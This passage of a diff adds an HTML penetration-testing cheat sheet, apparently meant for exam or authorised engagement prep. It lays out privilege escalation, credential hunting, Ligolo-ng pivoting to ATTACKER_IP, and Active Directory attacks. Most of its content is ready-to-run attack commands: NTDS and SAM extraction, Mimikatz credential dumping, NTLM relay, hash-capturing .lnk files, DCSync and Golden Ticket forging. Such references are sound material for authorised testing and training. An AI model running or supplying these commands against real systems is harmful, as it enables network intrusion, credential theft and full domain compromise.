+Launch LinPEAS immediately (background)
+Hunt credentials in parallel</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">PrivEsc Decision Flow — Work Top to Bottom</div>
+
+        <div class="priority">
+          <div class="p-box">
+            <div class="p-box-title t1">TIER 1 — Check in 2 min</div>
+            <ul>
+              <li>sudo -l → anything → GTFOBins</li>
+              <li>docker group → instant root (mount host FS)</li>
+              <li>lxd/lxc group → instant root</li>
+              <li>disk group → debugfs → read /etc/shadow</li>
+              <li>adm group → aureport --tty → typed passwords</li>
+              <li>video group → read framebuffer</li>
+            </ul>
+          </div>
+          <div class="p-box">
+            <div class="p-box-title t2">TIER 2 — SUID/Capabilities (5 min)</div>
+            <ul>
+              <li>find / -perm -u=s -type f 2>/dev/null</li>
+              <li>Non-standard SUID → GTFOBins</li>
+              <li>Custom binary → strings → PATH hijack?</li>
+              <li>getcap -r / 2>/dev/null</li>
+              <li>python + cap_setuid = instant root</li>
+            </ul>
+          </div>
+          <div class="p-box">
+            <div class="p-box-title t3">TIER 3 — Credentials (5 min)</div>
+            <ul>
+              <li>~/.bash_history → typed passwords</li>
+              <li>/opt/ → ALWAYS. Custom apps = hardcoded creds</li>
+              <li>find / -name ".env" 2>/dev/null</li>
+              <li>find / -name "wp-config.php"</li>
+              <li>aureport --tty (if adm group)</li>
+            </ul>
+          </div>
+          <div class="p-box">
+            <div class="p-box-title t4">TIER 4 — Services & Cron (10 min)</div>
+            <ul>
+              <li>ss -tulpn → internal root ports → forward + exploit</li>
+              <li>cat /etc/crontab → writable scripts?</li>
+              <li>ls /etc/cron.* → all cron directories</li>
+              <li>Writable script run by root? → add shell</li>
+            </ul>
+          </div>
+          <div class="p-box" style="grid-column: 1/-1;">
+            <div class="p-box-title t5">TIER 5 — Last Resort: NFS & Kernel</div>
+            <ul>
+              <li>showmount -e localhost → no_root_squash? → SUID binary exploit</li>
+              <li>PwnKit (CVE-2021-4034) — check if unpatched</li>
+              <li>DirtyPipe (CVE-2022-0847) — kernel 5.8–5.16</li>
+              <li>Baron Samedit — sudo &lt; 1.9.5p2</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Credential Locations on Linux</div>
+        <pre>/opt/                           ← ALWAYS CHECK. Custom apps. Hardcoded.
+~/.bash_history                 ← Typed passwords
+/var/www/html/config.php        ← DB password
+/var/www/html/.env              ← All env vars
+wp-config.php                   ← WordPress DB
+/home/&lt;users&gt;/.ssh/id_rsa       ← SSH keys
+aureport --tty (adm group)      ← Terminal audit log
+/tmp/                           ← Leftover scripts/data</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Container Detection & Escape</div>
+        <pre>ls /.dockerenv → Docker container
+cat /proc/1/cgroup → shows container runtime
+    ↓
+In docker group? → Escape to host immediately
+In container, NOT docker group?
+  → Check capabilities (cap_sys_admin = escape)
+  → /var/run/docker.sock writable?
+  → Privileged container? → mount host FS
+  → Look for mounted host paths (/mnt, /host, env vars)</pre>
+      </div>
+    </div>
+
+    <!-- L6 -->
+    <div class="section" id="l6">
+      <div class="section-header">
+        <span class="section-badge">LAYER 6</span>
+        <span class="section-title">Windows Post-Exploitation</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">First 60 Seconds</div>
+        <pre>whoami /all           ← USERNAME + GROUPS + ALL PRIVILEGES [CRITICAL]
+net user &lt;me&gt;         ← Description field = passwords sometimes
+systeminfo            ← OS, patches, domain
+ipconfig /all         ← Networks? SECOND NIC? DNS servers?
+netstat -ano          ← Internal ports, active connections
+    ↓
+Launch winPEAS (background, save output)</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Windows Privileges — Path to SYSTEM</div>
+        <div class="tbl-wrap">
+          <table class="priv-table">
+            <thead><tr><th>Privilege</th><th>Path to SYSTEM</th></tr></thead>
+            <tbody>
+              <tr><td>SeImpersonatePrivilege</td><td>PrintSpoofer / RoguePotato → SYSTEM immediately</td></tr>
+              <tr><td>SeAssignPrimaryToken</td><td>Same as above</td></tr>
+              <tr><td>SeBackupPrivilege</td><td>Copy SAM+SYSTEM hive → secretsdump, or diskshadow for NTDS</td></tr>
+              <tr><td>SeDebugPrivilege</td><td>Dump LSASS → Mimikatz → plaintext creds</td></tr>
+              <tr><td>SeTakeOwnershipPrivilege</td><td>Take ownership of any file including SAM</td></tr>
+              <tr><td>SeLoadDriverPrivilege</td><td>Load malicious driver → SYSTEM</td></tr>
+              <tr><td>SeRestorePrivilege</td><td>Write any file → replace binaries</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="alert red">
+          <div class="alert-label">CRITICAL</div>
+          SeImpersonatePrivilege or SeAssignPrimaryToken? → STOP. PrintSpoofer or RoguePotato. Don't look for anything else first.
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SeBackupPrivilege — NTDS Extraction</div>
+        <pre>Create diskshadow script (.dsh):
+  set context persistent nowriters
+  add volume c: alias BACKUP_ALIAS
+  create
+  expose %BACKUP_ALIAS% z:
+    ↓
+Convert line endings: unix2dos script.dsh
+    ↓
+diskshadow /s script.dsh
+    ↓
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\system system
+    ↓
+Download both → impacket-secretsdump -system system -ntds ntds.dit LOCAL</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Windows Credential Hunting</div>
+        <pre>1. Registry autologon:
+   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+   → DefaultPassword = cleartext  |  DefaultUserName = who it is
+
+2. Deployment leftovers:
+   C:\Windows\Panther\Unattend.xml
+   C:\Windows\system32\sysprep\sysprep.xml
+
+3. PowerShell history:
+   %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+4. .Cred files (PowerShell credential objects):
+   → $cred = Import-CliXml -Path "file.Cred"
+   → $cred.GetNetworkCredential().Password
+   → Only decryptable as the user who created it
+
+5. Sticky Notes:
+   → AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite
+
+6. Web app configs:
+   C:\inetpub\wwwroot\web.config  |  C:\xampp\htdocs\config.php
+
+7. LaZagne (browser passwords, Windows creds, apps)
+
+8. Event Log Readers group:
+   wevtutil qe Security /rd:true /f:text | Select-String "/user"</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Got Admin/SYSTEM — Before Moving On</div>
+        <pre>hashdump / meterpreter → all local hashes
+    ↓
+Mimikatz: sekurlsa::logonpasswords → plaintext
+    ↓
+SAM + SYSTEM hive → secretsdump → more hashes
+    ↓
+LSA secrets → DefaultPassword? → service account creds
+    ↓
+Try EVERY hash and password on every other service
+→ Pass the hash: evil-winrm, psexec, RDP, CrackMapExec</pre>
+      </div>
+    </div>
+
+    <!-- L7 -->
+    <div class="section" id="l7">
+      <div class="section-header">
+        <span class="section-badge yellow">LAYER 7</span>
+        <span class="section-title">Pivoting & Tunneling</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Pivot Host Found — Setup Order</div>
+        <pre>1. ip a / ipconfig /all → note EVERY subnet → Second NIC = next target
+2. arp -a → hosts that communicated → even recently offline appear
+3. /etc/hosts → internal hostnames → internal services
+4. Set up tunnel BEFORE starting internal recon
+5. Internal discovery through tunnel → repeat full methodology</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Ligolo-ng — Full Setup</div>
+        <pre>ATTACKER:
+  sudo ip tuntap add user $(whoami) mode tun ligolo
+  sudo ip link set ligolo up
+  ./proxy -selfcert -laddr 0.0.0.0:11601
+
+PIVOT (Linux):   ./agent -connect ATTACKER_IP:11601 -ignore-cert
+PIVOT (Windows): .\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
+
+LIGOLO CONSOLE:
+  session → select session → start
+
+ADD ROUTE:
+  sudo ip route add 172.16.x.0/24 dev ligolo
+  → Now reach internal hosts directly (no proxychains!)
+
+REVERSE SHELLS BACK THROUGH TUNNEL:
+  listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT
+  → Makes pivot host listen and forward to your Kali:PORT
+  → Use PIVOT HOST IP as LHOST in payloads
+
+DOUBLE PIVOT:
+  → Deploy second agent from second pivot host
+  → Add second session → add second route</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">SSH Tunneling</div>
+        <pre>Dynamic SOCKS proxy:
+  ssh -D 1080 user@pivot
+  → proxychains4.conf → socks5 127.0.0.1 1080
+  → proxychains &lt;any tool&gt;
+
+Local port forward:
+  ssh -L local_port:target_ip:target_port user@pivot
+  → Access at localhost:local_port
+
+Remote port forward:
+  ssh -R pivot_ip:port:0.0.0.0:listener_port user@pivot
+  → Requires GatewayPorts yes in sshd_config</pre>
+      </div>
+    </div>
+
+    <!-- L8 -->
+    <div class="section" id="l8">
+      <div class="section-header">
+        <span class="section-badge red">LAYER 8</span>
+        <span class="section-title">Active Directory</span>
+      </div>
+
+      <div class="alert">
+        <div class="alert-label" style="color:var(--accent3)">⚠ SYNC CLOCK FIRST — ALWAYS</div>
+        sudo ntpdate -u &lt;DC_IP&gt; — Kerberos fails silently if clock is off by 5+ minutes. Error looks like wrong password. Do this before every AD attack.
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">No Credentials — How to Get First Creds</div>
+        <pre>PASSIVE (safe):
+  → Responder in analyze mode → ARP/MDNS/NBNS reveals hostnames/IPs
+
+ACTIVE ENUMERATION:
+  → SMB null session: enum4linux -a DC_IP
+  → rpcclient -U "" -N DC_IP → enumdomusers
+  → LDAP anon: ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"
+  → Kerbrute username brute
+  → RID brute (lookupsid.py)
+    ↓
+FIRST CREDENTIAL PATHS:
+  1. AS-REP Roasting (no creds needed)
+     → DONT_REQ_PREAUTH accounts → request hash → crack (hashcat -m 18200)
+
+  2. LLMNR/NBT-NS Poisoning (Responder)
+     → Run during working hours → NTLMv2 hashes → crack (hashcat -m 5600)
+
+  3. Password Spraying
+     → Get policy FIRST to avoid lockout
+     → One attempt per account per lockout window
+     → Common: Password1, Welcome1, Summer2024, Company+year</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Got Domain Creds — First 5 Actions</div>
+        <pre>1. BloodHound IMMEDIATELY
+   bloodhound-python -u user -p pass -d domain -dc DC_IP -c ALL
+   Mark all owned nodes → "Find Shortest Paths to Domain Admins"
+
+2. Kerberoast all SPN accounts
+   impacket-GetUserSPNs → crack offline (hashcat -m 13100)
+
+3. Check SYSVOL for GPP passwords
+   → SYSVOL\...\Policies\...\Groups.xml → cpassword → gpp-decrypt
+
+4. Snaffler on all accessible shares
+   → Automates finding credentials in files
+
+5. Check ALL user description fields
+   → LDAP query all users, return description
+   → Admins put plaintext passwords in descriptions constantly</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">BloodHound Edge Reference</div>
+        <div class="tbl-wrap">
+          <table class="edge-table">
+            <thead><tr><th>Edge</th><th>What You Can Do</th><th>How</th></tr></thead>
+            <tbody>
+              <tr><td>GenericAll on user</td><td>Reset password, Kerberoast, Shadow Creds</td><td>Most flexible</td></tr>
+              <tr><td>GenericAll on group</td><td>Add yourself to the group</td><td>Add-DomainGroupMember</td></tr>
+              <tr><td>GenericWrite on user</td><td>Set SPN → Targeted Kerberoast</td><td>Set-DomainObject serviceprincipalname</td></tr>
+              <tr><td>ForceChangePassword</td><td>Change their password (noisy)</td><td>Set-DomainUserPassword</td></tr>
+              <tr><td>AddKeyCredentialLink</td><td>Shadow Credentials → NTLM hash silently</td><td>Whisker.exe add</td></tr>
+              <tr><td>DS-Replication-Get-Changes-All</td><td>DCSync → dump all hashes</td><td>secretsdump / mimikatz dcsync</td></tr>
+              <tr><td>WriteDACL</td><td>Grant yourself any right</td><td>Add-DomainObjectAcl</td></tr>
+              <tr><td>WriteOwner</td><td>Take ownership → grant GenericAll</td><td>Set-DomainObjectOwner</td></tr>
+              <tr><td>CanPSRemote</td><td>evil-winrm into the machine</td><td>evil-winrm</td></tr>
+              <tr><td>SQLAdmin</td><td>MSSQL → xp_cmdshell → shell</td><td>mssqlclient.py</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">ACL Abuse — Stealth Order (Most → Least Noisy)</div>
+        <pre>AddKeyCredentialLink → Shadow Credentials
+  → No password change, user never notices, gets NTLM hash via PKINIT
+    ↓
+GenericWrite → Set SPN → Kerberoast
+  → No password change, offline cracking, stealthy
+    ↓
+AddMember → Add to group
+  → No individual account changes, visible in group membership logs
+    ↓
+WriteOwner → take ownership → add GenericAll → do whatever
+    ↓
+ForceChangePassword → change their password
+  → Noisiest — user notices — confirm with client first</pre>
+      </div>
+    </div>
+
+    <!-- L9 -->
+    <div class="section" id="l9">
+      <div class="section-header">
+        <span class="section-badge red">LAYER 9</span>
+        <span class="section-title">AD Exploitation & Lateral Movement</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Lateral Movement — Access Methods</div>
+        <pre>Have credentials or hash?
+    ↓
+WinRM (5985)?
+  evil-winrm -i IP -u user -p pass
+  evil-winrm -i IP -u user -H NTLM_HASH
+    ↓
+SMB + admin?
+  impacket-psexec domain/user:pass@IP
+  impacket-psexec -hashes :NTLM domain/user@IP
+  impacket-smbexec (lower footprint)
+    ↓
+WMI?
+  impacket-wmiexec domain/user:pass@IP
+    ↓
+RDP (3389)?
+  xfreerdp /u:user /p:pass /v:IP /dynamic-resolution
+  xfreerdp /u:user /pth:NTLM /v:IP (PTH — needs DisableRestrictedAdmin)</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Pass-the-Hash via RDP Failing?</div>
+        <pre>xfreerdp /pth gives "access denied"?
+    ↓
+Enable Restricted Admin mode first (from existing admin shell):
+  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+    ↓
+Then PTH with xfreerdp works</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">LLMNR/NBT-NS Poisoning</div>
+        <pre>Responder active during working hours → captures NTLMv2
+    ↓
+Captured hash → hashcat -m 5600 → crack
+    ↓
+If cracking fails → NTLM relay (if SMB signing disabled)
+  crackmapexec smb CIDR --gen-relay-list targets.txt
+  impacket-ntlmrelayx -tf targets.txt -smb2support -l loot
+    ↓
+Malicious .lnk on accessible share:
+  netexec smb DC_IP -u user -p pass -M slinky -o SERVER=your_IP NAME=file
+  → Admin views share → hash captured by Responder</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">AD Vulnerability Checklist (Run After Getting Domain Creds)</div>
+        <pre>ADCS (Active Directory Certificate Services)
+  certipy find -u user@domain -p pass -dc-ip DC_IP
+  → ESC1 = request cert as any user including DA → get their NTLM hash
+  → 30 seconds to check. Potentially game over.
+    ↓
+NoPac (CVE-2021-42278 + CVE-2021-42287)
+  python3 noPac.py domain/user:pass -dc-ip DC_IP -use-ldap -shell
+  → Low priv → Domain Admin directly
+    ↓
+GPP Passwords
+  SYSVOL\...\Groups.xml → cpassword → gpp-decrypt
+    ↓
+PASSWD_NOTREQD accounts
+  Get-DomainUser | ? {$_.useraccountcontrol -like "*PASSWD_NOTREQD*"}
+  → Try blank passwords
+    ↓
+DNSAdmins group
+  → Load malicious DLL via DNS service → SYSTEM
+    ↓
+Kerberos Delegation
+  → Unconstrained: coerce DC → TGT capture
+  → RBCD attack</pre>
+      </div>
+    </div>
+
+    <!-- L10 -->
+    <div class="section" id="l10">
+      <div class="section-header">
+        <span class="section-badge red">LAYER 10</span>
+        <span class="section-title">Domain Escalation & Cross-Forest</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">DCSync</div>
+        <pre>Requirements: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
+    ↓
+Linux: impacket-secretsdump domain/user:pass@DC_IP
+       impacket-secretsdump -hashes :NTLM domain/user@DC_IP
+    ↓
+Windows (Mimikatz):
+  lsadump::dcsync /domain:domain.local /user:Administrator
+  lsadump::dcsync /domain:domain.local /all /csv
+    ↓
+Gets: ALL hashes including krbtgt
+→ krbtgt hash = Golden Ticket capability
+→ Administrator hash = immediate access everywhere</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">After Domain Admin — Don't Stop</div>
+        <pre>DCSync → dump all hashes → document krbtgt
+    ↓
+Check additional NICs on DC (ipconfig /all)
+→ Second NIC bridges to management/isolated networks
+    ↓
+Check IT shares as DA
+→ SSH keys → try on every Linux host in scope
+→ VPN configs, firewall credentials
+    ↓
+Check domain trusts: Get-DomainTrust or Get-ADTrust
+→ Inbound/outbound/bidirectional?
+→ Cross-forest Kerberoasting
+→ SIDHistory abuse
+→ ExtraSIDs attack (child to parent domain)</pre>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Golden Ticket</div>
+        <pre>Have krbtgt hash from DCSync?
+    ↓
+Windows (Mimikatz):
+  kerberos::golden /user:administrator /domain:domain.local /sid:DOMAIN_SID /krbtgt:HASH /ptt
+    ↓
+Linux (impacket):
+  ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.local administrator
+  export KRB5CCNAME=administrator.ccache
+  psexec.py -k -no-pass domain.local/administrator@DC_HOSTNAME
+    ↓
+Survives password changes — only invalidated when krbtgt changed TWICE</pre>
+      </div>
+    </div>
+
+    <!-- PANIC -->
+    <div class="section" id="panic">
+      <div class="section-header">
+        <span class="section-badge yellow">PANIC</span>
+        <span class="section-title">Checklists</span>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">No Foothold After 2 Hours</div>
+        <ul class="checklist">
+          <li><div class="box"></div>Scanned UDP? SNMP/NFS often only there</li>
+          <li><div class="box"></div>DNS zone transfer done?</li>
+          <li><div class="box"></div>VHost brute with multiple wordlists?</li>
+          <li><div class="box"></div>Tested ALL HTTP methods? (TRACK, OPTIONS, PUT, DELETE)</li>
+          <li><div class="box"></div>Checked custom headers? (X-Forwarded-For, X-Custom-IP-Authorization)</li>
+          <li><div class="box"></div>.git/, .env, .DS_Store exposed?</li>
+          <li><div class="box"></div>Tested ALL inputs including headers and cookies?</li>
+          <li><div class="box"></div>Registered on Gogs/GitLab? Browsed all repos?</li>
+          <li><div class="box"></div>Tried PDF/document generation injection?</li>
+          <li><div class="box"></div>Read all JavaScript files for hidden endpoints?</li>
+          <li><div class="box"></div>Checked for API endpoints separately?</li>
+          <li><div class="box"></div>Ran Nikto?</li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Shell But No PrivEsc (Linux)</div>
+        <ul class="checklist">
+          <li><div class="box"></div>Checked capabilities? getcap -r /</li>
+          <li><div class="box"></div>Checked ALL groups? Docker/lxd/disk = instant root</li>
+          <li><div class="box"></div>In adm group? Run aureport --tty</li>
+          <li><div class="box"></div>Looked in /opt? Custom apps = hardcoded creds</li>
+          <li><div class="box"></div>Checked internal listening ports? ss -tulpn</li>
+          <li><div class="box"></div>Checked NFS exports? showmount -e localhost</li>
+          <li><div class="box"></div>Checked writable cron job scripts specifically?</li>
+          <li><div class="box"></div>Grepped all config files for passwords?</li>
+          <li><div class="box"></div>Read .bash_history?</li>
+          <li><div class="box"></div>Ran LinPEAS and read ALL of it?</li>
+          <li><div class="box"></div>Checked Python library hijacking?</li>
+          <li><div class="box"></div>Checked tmux sessions owned by root?</li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Shell But No PrivEsc (Windows)</div>
+        <ul class="checklist">
+          <li><div class="box"></div>SeImpersonatePrivilege? → PrintSpoofer</li>
+          <li><div class="box"></div>cmdkey /list? → saved creds</li>
+          <li><div class="box"></div>Registry autologon DefaultPassword?</li>
+          <li><div class="box"></div>C:\Windows\Panther\Unattend.xml?</li>
+          <li><div class="box"></div>PowerShell history file?</li>
+          <li><div class="box"></div>User description fields?</li>
+          <li><div class="box"></div>Scheduled tasks → writable scripts?</li>
+          <li><div class="box"></div>Non-standard software → CVEs?</li>
+          <li><div class="box"></div>Event Log Readers group → wevtutil Security logs?</li>
+          <li><div class="box"></div>.Cred files → Import-CliXml decrypt?</li>
+          <li><div class="box"></div>SeBackupPrivilege → diskshadow NTDS?</li>
+          <li><div class="box"></div>Ran winPEAS and read ALL of it?</li>
+        </ul>
+      </div>
+
+      <div class="subsection">
+        <div class="subsection-title">Stuck in AD</div>
+        <ul class="checklist">
+          <li><div class="box"></div>BloodHound with ALL owned nodes marked?</li>
+          <li><div class="box"></div>Kerberoasted ALL SPN accounts?</li>
+          <li><div class="box"></div>Checked SYSVOL for GPP passwords?</li>
+          <li><div class="box"></div>Run Snaffler on ALL accessible shares?</li>
+          <li><div class="box"></div>Checked ALL user description fields?</li>
+          <li><div class="box"></div>Sprayed found passwords against all domain users?</li>
+          <li><div class="box"></div>Run Certipy for ADCS? (30 seconds, potentially game over)</li>
+          <li><div class="box"></div>Checked Kerberos delegation?</li>
+          <li><div class="box"></div>Computer objects in BloodHound (not just users)?</li>
+          <li><div class="box"></div>PASSWD_NOTREQD accounts?</li>
+          <li><div class="box"></div>Backup services running internally?</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- KILLS -->
+    <div class="section" id="kills">
+      <div class="section-header">
+        <span class="section-badge red">DANGER</span>
+        <span class="section-title">Things That Kill You</span>
+      </div>
+
+      <div class="kill-item"><strong>Clock Sync</strong><p>Kerberos fails silently. Error looks like wrong password. Sync before every AD engagement: <code>sudo ntpdate -u DC_IP</code></p></div>
+      <div class="kill-item"><strong>Credential Reuse</strong><p>Every password found ANYWHERE goes into your credentials list and gets tried on every service. One reused password = the chain.</p></div>
+      <div class="kill-item"><strong>VHost Brute Force</strong><p>Zone transfer gives obvious subdomains. VHost brute finds dev/staging/uat never in DNS. Run both with multiple wordlists — they find different things.</p></div>
+      <div class="kill-item"><strong>GitLab/Gogs Registration</strong><p>Open registration → register → browse all projects → internal subdomains, hardcoded credentials, API keys, infrastructure details.</p></div>
+      <div class="kill-item"><strong>HTTP Verb Tampering</strong><p>403 on endpoint? Try OPTIONS, TRACK, PUT, PATCH, DELETE. Different verbs can reveal headers or bypass access controls entirely.</p></div>
+      <div class="kill-item"><strong>NFS is Treasure</strong><p>Internally mounted NFS shares almost always have interesting files: config files with DB passwords, SSH keys, application backups. Mount everything.</p></div>
+      <div class="kill-item"><strong>adm Group = Credentials in Logs</strong><p><code>aureport --tty</code> shows everything ever typed in a terminal — passwords typed during <code>su</code> or service configuration are all there.</p></div>
+      <div class="kill-item"><strong>BloodHound Without Owned Nodes</strong><p>If you haven't marked everything you control as owned, paths won't show. Mark every compromised account and host as you gain access.</p></div>
+      <div class="kill-item"><strong>Second NICs After DA</strong><p>After Domain Admin, check <code>ipconfig /all</code> on the DC. A second NIC to a management/isolated network is extremely common and extremely valuable.</p></div>
+      <div class="kill-item"><strong>Werkzeug PIN</strong><p>Debug mode doesn't mean open console. Calculate: username + MAC address (hex→decimal) + machine ID from <code>/error</code> or <code>/etc/machine-id</code>. Newer versions use sha1 not md5.</p></div>
+      <div class="kill-item"><strong>API Role Fields</strong><p>The API trusts what you send. <code>{"role":"admin"}</code> to an update endpoint, re-login, check if it worked. Test every field in every JSON body.</p></div>
+      <div class="kill-item"><strong>.Cred Files</strong><p>PowerShell credential objects. Decryptable only as the creating user. If you're running as them: <code>Import-CliXml</code> → <code>.GetNetworkCredential().Password</code> = plaintext.</p></div>
+      <div class="kill-item"><strong>Duplicati/Backup UIs</strong><p>Backup software runs as root/SYSTEM. Reach the web UI → "restore" <code>/root/flag.txt</code> to a readable location without needing a root shell.</p></div>
+      <div class="kill-item"><strong>Ligolo listener_add</strong><p>Internal machines can't reach your Kali directly. <code>listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT</code> makes pivot host listen and forward. Use pivot IP as LHOST.</p></div>
+      <div class="kill-item"><strong>Targeted Kerberoasting</strong><p>GenericWrite doesn't need to mean password reset. Set fake SPN → Kerberoast → crack offline → silent, no visible account changes.</p></div>
+      <div class="kill-item"><strong>Document Everything in Real Time</strong><p>Password resets, group memberships, files uploaded, accounts created. You WILL forget. The client needs the appendix.</p></div>
+    </div>
+
+    <!-- HASHES -->
+    <div class="section" id="hashes">
+      <div class="section-header">
+        <span class="section-badge">REF</span>
+        <span class="section-title">Hash Cracking Reference</span>
+      </div>
+
+      <div class="tbl-wrap">
+        <table class="hash-table">
+          <thead><tr><th>What You Have</th><th>Mode</th><th>Speed</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td>NTLM (from SAM/hashdump)</td><td>1000</td><td>Very fast</td><td>Pass the hash directly too</td></tr>
+            <tr><td>NTLMv2 (Responder capture)</td><td>5600</td><td>Fast</td><td>Can't pass, must crack</td></tr>
+            <tr><td>Kerberoast TGS (RC4)</td><td>13100</td><td>Fast</td><td>Most common type</td></tr>
+            <tr><td>Kerberoast TGS (AES)</td><td>19600/19700</td><td>Slower</td><td>AES128/AES256</td></tr>
+            <tr><td>AS-REP Roast</td><td>18200</td><td>Fast</td><td>No pre-auth required</td></tr>
+            <tr><td>MD5 ($1$)</td><td>500</td><td>Fast</td><td>Linux shadow</td></tr>
+            <tr><td>SHA512crypt ($6$)</td><td>1800</td><td>Slow</td><td>Modern Linux</td></tr>
+            <tr><td>bcrypt ($2a$/$2b$)</td><td>3200</td><td>Very slow</td><td>Common in web apps</td></tr>
+            <tr><td>SHA1</td><td>100</td><td>Very fast</td><td>Various</td></tr>
+            <tr><td>KeePass (.kdbx)</td><td>13400</td><td>Slow</td><td>Extract with keepass2john</td></tr>
+            <tr><td>WPA2</td><td>22000</td><td>GPU dependent</td><td>—</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="subsection" style="margin-top:20px">
+        <div class="subsection-title">Cracking Strategy</div>
+        <pre>1. rockyou.txt (14M passwords) → covers most weak passwords
+2. rockyou.txt + best64.rule   → covers variations
+3. rockyou.txt + dive.rule     → deeper variations
+4. Targeted wordlist (company name, found passwords, usernames combined)
+5. Hashcat mask attack → if you know the pattern (?u?l?l?l?d?d?d?d)
+6. Large wordlists (kaonashi, probable-wordlists) → stubborn hashes
+    ↓
+Slow hashes (bcrypt, VeraCrypt, psafe3):
+  → Don't use rockyou.txt — too big, too slow
+  → Use targeted small lists (500 most common passwords)
+  → GPU cracking rig makes this practical</pre>
+      </div>
+
+      <div class="div"></div>
+
+      <div class="flow" style="text-align:center; border-color: var(--accent2); padding: 24px;">
+<span style="color:var(--accent2); font-family:'Orbitron',monospace; font-size:12px;">FINAL MINDSET</span>
+<br><br>
+<span style="color:var(--text)">If you're stuck → you haven't enumerated enough</span>
+<br><span style="color:var(--text)">If you have a shell → check groups and sudo FIRST</span>
+<br><span style="color:var(--text)">If you have Windows access → whoami /priv FIRST</span>
+<br><span style="color:var(--text)">If you have domain creds → BloodHound FIRST</span>
+<br><span style="color:var(--text)">If you have DA → check second NICs and trusts</span>
+<br><br>
+<span style="color:var(--accent)">The answer is always in the data.</span>
+<br><span style="color:var(--text-dim)">You either haven't found it yet, or you found it and didn't recognize it.</span>
+<br><br>
+<span style="color:var(--accent2); font-family:'Orbitron',monospace; font-size:14px; letter-spacing:3px;">ENUMERATE HARDER.</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  // Highlight active nav item based on scroll
+  const sections = document.querySelectorAll('.section[id]');
+  const navItems = document.querySelectorAll('.nav-item');
+
+  const observer = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        navItems.forEach(n => n.style.color = '');
+        navItems.forEach(n => n.style.borderLeftColor = '');
+        const link = document.querySelector(`.nav-item[href="#${entry.target.id}"]`);
+        if (link) {
+          link.style.color = 'var(--accent)';
+          link.style.borderLeftColor = 'var(--accent)';
+        }
+      }
+    });
+  }, { threshold: 0.3 });
+
+  sections.forEach(s => observer.observe(s));
+</script>
+</body>
+</html>
